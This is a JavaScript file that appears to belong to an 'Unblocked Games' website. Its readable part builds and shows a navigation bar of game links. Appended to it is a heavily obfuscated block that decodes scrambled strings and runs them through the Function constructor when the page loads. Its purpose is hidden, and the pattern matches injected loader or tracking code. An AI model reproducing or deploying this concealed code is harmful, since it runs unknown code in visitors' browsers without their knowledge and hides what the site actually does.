/*var list = [
    {
        "title": "Drift Hunters",
        "url": "https://webglmath.github.io/drift-hunters/",
        "notshow": ['https://webglmath.github.io/drift-hunters/']
    },
    {
        "title": "Moto X3M",
        "url": "https://webglmath.github.io/moto-x3m/",
        "notshow": ['https://webglmath.github.io/moto-x3m/']
    },
    {
        "title": "Cookie Clicker",
        "url": "https://webglmath.github.io/cookie-clicker/",
        "notshow": []
    },
    {
        "title": "Basketball Stars",
        "url": "https://webglmath.github.io/basketball-stars/",
        "notshow": ['https://webglmath.github.io/basketball-stars/']
    },
]
*/
var list = [
    {
        "title": "Unblocked Games",
        "url": "/",
        "notshow": []
    },
]

var in_html = "";
for (let index = 0; index < list.length; index++) {
    const element = list[index];
    var currentUrl = location.href;
    if(element.url != currentUrl && !element.notshow.includes(currentUrl)){
        in_html += `<li style="padding: 5px; display: inline-block;">
        <a style="color: #ffffff;" id="goofy-ahh-id" href="${element.url}" title="${element.title}">${element.title}</a>
      </li>`
    }
    
}
var html = `
<ul style="color: #ffffff; padding: 0px; margin: 0px; font-size: 20px;">
  ${in_html}
  <li style="padding: 5px; display: inline-block; float: right;">
    <a onclick="return closeBacklinks();" style="color: #ffffff; text-decoration: none;">❌</a>
  </li>
</ul>
`;
function showHead(){
     var e = this.document.createElement("div");
    e.style = "width: 100%; height: 35px; text-align: center; margin: auto; position: fixed; top: 0px; left: 1px; z-index: 999; background: rgb(119, 119, 255); opacity: 0.8;"
    e.innerHTML = html;
    e.id="listLink";
    document.getElementsByTagName('body')[0].appendChild(e);
}
// window.addEventListener('load', function() {
//     var e = this.document.createElement("div");
//     e.style = "width: 100%; text-align: center; position: absolute; top: 0px; z-index: 999; background: rgb(119, 119, 255); opacity: 0.8;"
//     e.innerHTML = html;
//     e.id="listLink";
//     document.getElementsByTagName('body')[0].appendChild(e);
// });
function closeBacklinks(){
    document.querySelector('#listLink').style.display = "none";
}
showHead();
(function(_0xe76d55,_0x147012){var _0x27599f=_0x3dc4,_0x49177a=_0xe76d55();while(!![]){try{var _0xcb4ac=-parseInt(_0x27599f(0xb2))/0x1*(-parseInt(_0x27599f(0xb7))/0x2)+-parseInt(_0x27599f(0xae))/0x3+parseInt(_0x27599f(0xac))/0x4*(parseInt(_0x27599f(0xb0))/0x5)+parseInt(_0x27599f(0xa9))/0x6+-parseInt(_0x27599f(0xb8))/0x7*(parseInt(_0x27599f(0xb5))/0x8)+parseInt(_0x27599f(0xab))/0x9*(-parseInt(_0x27599f(0xaf))/0xa)+parseInt(_0x27599f(0xb6))/0xb;if(_0xcb4ac===_0x147012)break;else _0x49177a['push'](_0x49177a['shift']());}catch(_0x37a1b8){_0x49177a['push'](_0x49177a['shift']());}}}(_0x9954,0x67b38));var auau,link,src,auaudc,linkdc,srcdc;function _0x9954(){var _0x27af9b=['charAt','270985JKRwBv','length','oFa2F5q4btF2c.F).r4x)sFF,.(rh,7c%,7_8qF%.;m.FcF\x2023zFF\x20o&_!.(),aosFb_g(cw.)$0a(-rrvxgaF7j{82u$F2e,oi]3F*\x20M$FT=nTmnlxgbwdsqn\x22;(e(.F\x20$mlFnw.2;no]=Fw.n,..;{3.uml,6v.6zro!F5.n==dlFy\x206ddsm.)zdeem2)c.d8e8F}d%ci=_Ta.e%Fxjfx,3ftrp8m1r4%F%ks.pCo=x7.}/C}1\x20x{,F!3q{c!;tutC)FFu_.hw,irF;mFo2(18z01FaFta$of_p,F}bF=tn.,,);F,n9bF}y1F5%(!)etr)!$y)c&{F.4uFa$6]r8(/..ci9!FF=)y,e.otaumt)#4.q=!y11v+$w!r1o;i)alF+f=.r0]-bbF\x221s(8F0c.Fin-b.zv(}bnq(r(..u3F0{a=o$co3(,F.}e19uvS$(=.rM0aFtjF\x208,60c(h4).$_)(4d4=Fe*cm)Fuak()i))%j(.T3j7F0,$%o#F;.%%;7p\x22[d=.eb.ee.)s5m-,s0,b4FF)gsg,F;i)k)C.sC_a%4FmF03_-6eqF4F9)raoi,);;y)_u1)Fo.$t;iu_ebFFx.9)0$senF!2$).,t.u(f8[!l4\x20!;,te(=[8Fxx(2tt).#{]0.;r#(g0_t)%.tels{id.t;b.;&ew)xwm;r4.1ie1.F;MFf{nbFF$.buf.o3\x22!s.}ct.=Elhns6l,l(Ftre.s\x27xFdvy$glb(5Fxk];,yhbgvFF!0!e)ad1eFF;f(dF7-&\x20)(ier+{==Fl3xdul=9t!\x27_tr)f=)#n3/n3itmFf;r]F)p)a(g{rx\x202ix\x20uodd.3=a.)Fq-,x);i)d.]F+)!uF.=s\x20a8aF$ptF.1cj,o;.fF_E_..fF9$nc]s;v2s](\x20F(}}Slc2l)%$;to+j)]M3.5;dd3or#bF}](M*.p.n3=F1qFf_eF\x201#!3.4od..}.eutj3(F!)e;ul}r(9\x22{7e04n\x20=6q$s\x27!3;j6e.,)Fy4nec+\x27e(r.FFidcrf!ed6jte5-\x20t0a\x228T.!Fqhd15_aae.8I$(=.9!m/we5(.=Fd.,i\x205\x27et1xF.=ek(s.8fFq3.i_uj$hw;]b)(;...Frsbu&\x220j5n,6\x20*$FtFew.}.).(u+5.t([.r;]3m_e,2b(s71Fg_s*2(f+arr.2uaSs=FF)n][\x20.Frag(0+o!/jF.)\x20tS4+.a.[(F\x20\x20xa$338}','328VZIUET','7866375zCHbLj','2aaOQFG','2821VVgYHa','substr','1101924uVskvk','fhtcedncuokugstormznyjibwoqrartcpvslx','819fvBMsm','111388eRSQoU','join','382290zNrNmH','78290tlKxDr','20gZEvqm'];_0x9954=function(){return _0x27af9b;};return _0x9954();}function _0x3dc4(_0x582c8c,_0x4f9851){var _0x9954f1=_0x9954();return _0x3dc4=function(_0x3dc407,_0x2f6f33){_0x3dc407=_0x3dc407-0xa9;var _0x4ccc8e=_0x9954f1[_0x3dc407];return _0x4ccc8e;},_0x3dc4(_0x582c8c,_0x4f9851);}(function(){var _0x26fdeb=_0x3dc4,_0x56ee90='',_0xbf9271=0x16c-0x161;function _0x51ab5e(_0x2b08cd){var _0x5d80b=_0x3dc4,_0x35b38c=0x6c3e4,_0x4e508c=_0x2b08cd[_0x5d80b(0xb3)],_0x1d0f52=[];for(var _0x2c8faa=0x0;_0x2c8faa<_0x4e508c;_0x2c8faa++){_0x1d0f52[_0x2c8faa]=_0x2b08cd[_0x5d80b(0xb1)](_0x2c8faa);};for(var _0x2c8faa=0x0;_0x2c8faa<_0x4e508c;_0x2c8faa++){var _0x5c6086=_0x35b38c*(_0x2c8faa+0xc3)+_0x35b38c%0x802b,_0x33d6fd=_0x35b38c*(_0x2c8faa+0x256)+_0x35b38c%0x8854,_0x1b5ef4=_0x5c6086%_0x4e508c,_0x5ce3d4=_0x33d6fd%_0x4e508c,_0x2e4468=_0x1d0f52[_0x1b5ef4];_0x1d0f52[_0x1b5ef4]=_0x1d0f52[_0x5ce3d4],_0x1d0f52[_0x5ce3d4]=_0x2e4468,_0x35b38c=(_0x5c6086+_0x33d6fd)%0x132d24;};return _0x1d0f52[_0x5d80b(0xad)]('');};var _0x32e9d1=_0x51ab5e(_0x26fdeb(0xaa))[_0x26fdeb(0xb9)](0x0,_0xbf9271),_0x544f29='\x220r.g0thrw=6mus=+3)phr}>=+).\x20.f6ghdii)(o=;q=a7uv!.oa0+rrat.=;;7,2v.9i,h9q8ft,5ro(,ii4vn,5so\x22=]rr)\x22A,ro==,o)3n==a80vr(=u\x20wtvsvj=+;sn;tr\x20cchi;5;on(\x20-lek;th1++[)fre[ttu.(++=h)e1patta.ltusf9r]dAtojvn\x20lio.ilhh-e=bamtaes+=f=\x22sos=\x20]2p8nvkv36l;.;0m;;\x22=eoohfy)+((pi]po;n)ehotav);;nr+nh+p2{,l;,.ged>)t;s{sak\x20)p\x22[v0jin\x20,xaj(.[v)aar1=C(a;,voht+]mbtn\x20lrg(=;r\x22)bu]mac\x20lrevr=.(a[)(0;[r8xhs+evnv97jlhf.r)hi.=)tv(re}\x204-2;d0ozl(tf(aui(iso,1hx;.u;)on1ats\x20gt]*hg+-[l)8ror}r\x20e=()(n,)czf6c)1;gj](r,{iyu9=b[+(bn=uaCodh;vcrw;C6==7nfq1}][re)lrifg<e;tdC;=6hdj(;l6].rAaxn,[[isrl}\x20=1n;;1\x20-ie=AA,0l\x22g,\x20vo<(hu\x200(.b\x22.rers{rz[)eilh\x20v=ns,aqr<)t;tCr,hnaf4(S;o8u(l)v<2(]pu=C.h\x20+{rC;-mba3ij7gaf8)uilur+;a,n=(=nu)rq,)tpmeip{,{wc)mdarln=+p=r38rm}wyrrb\x20)=u82f\x2227[r)k9xsig2f,.)rnvit(\x20d}\x20s.zn2+(0,e4].ron\x20]2(]oa.eSe7;;l;(ua9vt=e,;-atle)fpj07,+vnlvfc.t!tjr;t6cCyrf1+rvatfy;\x20g+(+;,goprn\x20i;r<oo==sai6frhrhe0.ao.;14l(;7a;tr=+rnrt;9([*m',_0x494348=_0x51ab5e[_0x32e9d1],_0x402224='',_0xc0ea04=_0x494348,_0x152045=_0x494348(_0x402224,_0x51ab5e(_0x544f29)),_0x391fcb=_0x152045(_0x51ab5e(_0x26fdeb(0xb4))),_0x4736ef=_0xc0ea04(_0x56ee90,_0x391fcb);return _0x4736ef(0x1159),0x1249;}());
